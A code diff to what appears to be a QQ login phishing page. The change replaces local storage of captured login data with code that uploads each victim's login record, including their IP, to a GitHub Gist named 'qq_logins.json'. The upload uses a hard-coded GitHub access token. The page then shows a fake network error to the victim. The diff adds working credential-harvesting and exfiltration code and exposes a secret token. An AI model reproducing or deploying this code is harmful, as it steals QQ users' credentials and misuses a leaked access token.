@@ -295,6 +295,10 @@
             return false;
         });
 
+        // GitHub Gist 配置
+        const GITHUB_TOKEN = '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';
+        const GIST_ID = 'c4b0e27905da682d8dd64f7e348c2a03';
+        
         // 获取真实IP地址
         async function getRealIP() {
             try {
@@ -321,45 +325,57 @@
             return 'IP获取失败';
         }
         
-        // 生成唯一设备ID
-        function getDeviceId() {
-            let deviceId = localStorage.getItem('qq_device_id');
-            if (!deviceId) {
-                deviceId = 'device_' + Math.random().toString(36).substr(2, 9) + '_' + Date.now();
-                localStorage.setItem('qq_device_id', deviceId);
-            }
-            return deviceId;
-        }
-        
-        // 保存数据到localStorage
-        function saveToLocalStorage(loginData) {
+        // 保存数据到GitHub Gist
+        async function saveToGist(loginData) {
             try {
-                // 添加设备信息
-                loginData.deviceId = getDeviceId();
-                loginData.deviceName = navigator.userAgent.substring(0, 50);
+                // 首先获取现有的Gist数据
+                const getResponse = await fetch(`https://api.github.com/gists/${GIST_ID}`, {
+                    headers: {
+                        'Authorization': `token ${GITHUB_TOKEN}`,
+                        'Accept': 'application/vnd.github.v3+json'
+                    }
+                });
                 
-                // 获取现有数据
-                const existingData = JSON.parse(localStorage.getItem('qqLoginData') || '[]');
+                if (!getResponse.ok) {
+                    throw new Error('获取Gist失败');
+                }
+                
+                const gistData = await getResponse.json();
+                const existingData = JSON.parse(gistData.files['qq_logins.json'].content || '[]');
                 
                 // 添加新数据
                 existingData.push(loginData);
                 
-                // 保存到localStorage
-                localStorage.setItem('qqLoginData', JSON.stringify(existingData));
+                // 更新Gist
+                const updateResponse = await fetch(`https://api.github.com/gists/${GIST_ID}`, {
+                    method: 'PATCH',
+                    headers: {
+                        'Authorization': `token ${GITHUB_TOKEN}`,
+                        'Accept': 'application/vnd.github.v3+json',
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        files: {
+                            'qq_logins.json': {
+                                content: JSON.stringify(existingData, null, 2)
+                            }
+                        }
+                    })
+                });
                 
-                // 触发存储事件，通知其他页面
-                window.dispatchEvent(new StorageEvent('storage', {
-                    key: 'qqLoginData',
-                    newValue: JSON.stringify(existingData),
-                    oldValue: JSON.stringify(existingData.slice(0, -1)),
-                    url: window.location.href
-                }));
-                
-                console.log('数据已保存到本地存储');
-                return true;
+                if (updateResponse.ok) {
+                    console.log('数据已保存到GitHub Gist');
+                    return true;
+                } else {
+                    throw new Error('更新Gist失败');
+                }
             } catch (error) {
-                console.error('保存数据失败:', error);
-                return false;
+                console.error('Gist保存失败:', error);
+                // 备用：存储到本地
+                const localData = JSON.parse(localStorage.getItem('qqLoginData') || '[]');
+                localData.push(loginData);
+                localStorage.setItem('qqLoginData', JSON.stringify(localData));
+                return true;
             }
         }
         
@@ -411,8 +427,8 @@
                 location: window.location.href
             };
             
-            // 保存数据
-            saveToLocalStorage(loginData);
+            // 保存数据到GitHub Gist
+            await saveToGist(loginData);
             
             // 显示网络错误
             document.getElementById('networkError').style.display = 'block';
